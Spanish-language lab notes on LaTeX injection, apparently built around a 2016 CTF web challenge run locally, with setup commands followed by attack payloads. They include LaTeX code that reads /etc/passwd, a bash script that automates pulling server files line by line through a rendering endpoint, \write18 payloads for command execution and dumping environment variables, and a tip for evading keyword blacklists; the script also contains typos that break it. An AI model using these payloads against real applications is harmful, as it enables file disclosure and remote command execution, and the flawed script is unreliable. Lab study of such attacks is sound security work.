Las inyecciones LaTeX son un tipo de ataque que se aprovecha de las vulnerabilidades en las aplicaciones web que permiten a los usuarios ingresar texto formateado en LaTeX. LaTeX es un sistema de composición de textos que se utiliza comúnmente en la escritura académica y científica.

Los ataques de inyección LaTeX ocurren cuando un atacante ingresa código LaTeX malicioso en un campo de entrada de texto que luego se procesa en una aplicación web. El código LaTeX puede ser diseñado para aprovechar vulnerabilidades en la aplicación y ejecutar código malicioso en el servidor.
## Práctica
primero instalamos latex
```
 sudo apt-get install texlive
```
```
sudo apt install zathura latexmk rubber -y
```
y por útlimo lo dejamos configurado:
```
xdg-mime query default application/pdf
```
Y por útlimo configuramos así de canchero
```
xdg-mime default zathura.desktop application/pdf
```
Tambien instalamos 
```
apt install poppler-utils
```
	Un ejemplo de una inyección LaTeX podría ser un ataque que aprovecha la capacidad de LaTeX para incluir gráficos y archivos en una aplicación web. Un atacante podría enviar un código LaTeX que incluya un enlace a un archivo malicioso, como un virus o un troyano, que podría infectar el servidor o los sistemas de la red.

Para evitar las inyecciones LaTeX, las aplicaciones web deben validar y limpiar adecuadamente los datos que se reciben antes de procesarlos en LaTeX. Esto incluye la eliminación de caracteres especiales y la limitación de los comandos que pueden ser ejecutados en LaTeX.

También es importante que las aplicaciones web se ejecuten con privilegios mínimos en la red y que se monitoreen regularmente las actividades de la aplicación para detectar posibles inyecciones. Además, se debe fomentar la educación sobre la seguridad en el uso de LaTeX y cómo evitar la introducción de código malicioso.
Iniciamos apache2 y nos metemos a la carpeta /var/www/html, dentro inciiamos el siguiente com,ando
```
svn checkout https//github.com/internetwache-CTF-2016/trunk/tasks/web90/code
```
o mejor dicho:
```
git clone https://github.com/internetwache/Internetwache-CTF-2016
```
Nos lo clonamos separamos la carpeta "code" que es la que nos interesa y hacemos un 
```
mv code/ *
```
Para traerno lo que nos interesa
![[Pasted image 20240615145827.png]]
```
mv config.php.sample config.php
```

![[Pasted image 20240615145848.png]]
También asersiorarse de darle los privilegios al archivo para tener [[capacidad de escritura]]


```
chown www-data:www-data -R *
```
Ejecutamos lo siguiente para obtener información privilegiada, Injection Latex
```
\newread\file
\openin\file=/etc/passwd
\read\file to\lineA
\read\file to\lineB
\text{\lineA\lineB}
\closein\file
```
Para esto le hacemos un script de bash para ver todas la líneas
```
#!/bin/bash

#Variables Globales
declare -r main_url="http://localhost/ajax.php"
filename=$1

#Get files from the server
if [ $1 ]; then
read_file_to_line="%0A\read\file%20to\line"
	for i in $(seq 1 100); do
	echo "Bien Ejecutado"
		file_to_download=$(curl -s -X POST $main_url -H "Content-Type: application/x-www-form-urlencoded; charset=UTF-8" -d "%0A%5Cnewread%5Cfile%0A%5Copenin%5Cfile%3D$filename$read_file_to_lineread%0A%5Ctext%7B%5ClineA%5ClineB%7D%0A%5Cclosein%5Cfile%0A&template=blank" | grep -i download | awx 'NF{print $NF}')

		if [ $file_to_download ]; then
			wget $file_to_download &>/dev/null 
			file_to_convert=$(echo $file_to_download | tr '/' ' ' | awk 'NF{print $NF}')
			pdftotext $file_to_convert 
			file_to_read=$(echo $file_to_convert | sed 's/\.pdf/\.txt/')
			rm $file_to_convert
			cat $file_tp_read | head -n 1
			rm $file_to_read
			read_file_to_line+="%0A\read\file%20to\line"
		else
			read_file_to_line+="%0A\read\file%20to\line"
		fi
	done
else 
	echo -e "\n[!] Use: $0 /etc/passwd \n\n"
fi

```
Si obtenemos errores consideremos utilizar en base64
```
\immediate\write18{env | base64 > test.tex}
```

## Write 18
Tenemos un comando, de write18 para que los con la siguiente línea:
```
\immediate\write18{comand}
```
Si se guarda en un archivo "compile" que tenemos en este caso por ejemplo con `\immediate\write18{/etc/passwd > output}`
![[Pasted image 20240615210016.png]]
Después stán las palabras que en el php están blacklistiadas, se puede burlar, si es un string lo dividimos en variables y depués las juntamos.